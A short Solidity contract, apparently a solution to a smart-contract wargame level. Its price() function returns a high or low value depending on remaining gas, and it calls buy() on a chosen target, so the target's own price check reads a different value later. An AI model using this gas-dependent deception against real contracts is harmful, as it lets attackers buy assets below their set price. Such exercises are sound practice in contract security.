//SPDX-License-Identifier:MIT
pragma solidity^0.8.0;

contract Buyer {

uint public rice = 10;
bool  public isChecked;
uint public gasCompare=150000;
address public _his;

function setGasComapre(uint _gas)public {
    gasCompare=_gas;
}

function setHis(address __his)public {
    _his=__his;
}

function price() external view returns(uint){
    if(gasleft()>gasCompare){
        return 111;
    }else{
        return 1;
    }
    

}


function dcallhim() public {
    _his.delegatecall(abi.encodeWithSignature('buy()'));
}

function callhim() public {
    _his.call{gas:200000}(abi.encodeWithSignature('buy()'));
}

}